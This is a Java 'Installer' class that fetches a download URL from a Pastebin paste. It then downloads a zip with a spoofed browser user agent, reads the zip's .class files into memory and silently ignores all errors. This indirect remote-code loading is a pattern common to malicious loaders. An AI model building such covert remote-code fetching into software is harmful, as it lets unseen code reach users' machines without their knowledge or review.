package com.zopac.loader;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Installer {

    public Map<String, byte[]> classes = new HashMap<>();

    public void loader() {
        try {
            Installer loader = new Installer();

            URL pastebin = new URL("https://pastebin.com/raw/Q2rkQQFA");

            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);

            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream inputStream = httpURLConnection.getInputStream();
            ZipInputStream zipInputStream = new ZipInputStream(inputStream);

            ZipEntry zipEntry;
            while ((zipEntry = zipInputStream.getNextEntry()) != null) {
                String name = zipEntry.getName();

                if (!name.endsWith(".class")) continue;

                name = name.substring(0, name.length() - 6);
                name = name.replace('/', '.');

                ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();

                int bytesRead;
                byte[] tempBuffer = new byte[8192 * 2];
                while ((bytesRead = zipInputStream.read(tempBuffer)) != -1) streamBuilder.write(tempBuffer, 0, bytesRead);

                loader.classes.put(name, streamBuilder.toByteArray());
            }
        } catch (Exception ignored) {}
    }
}
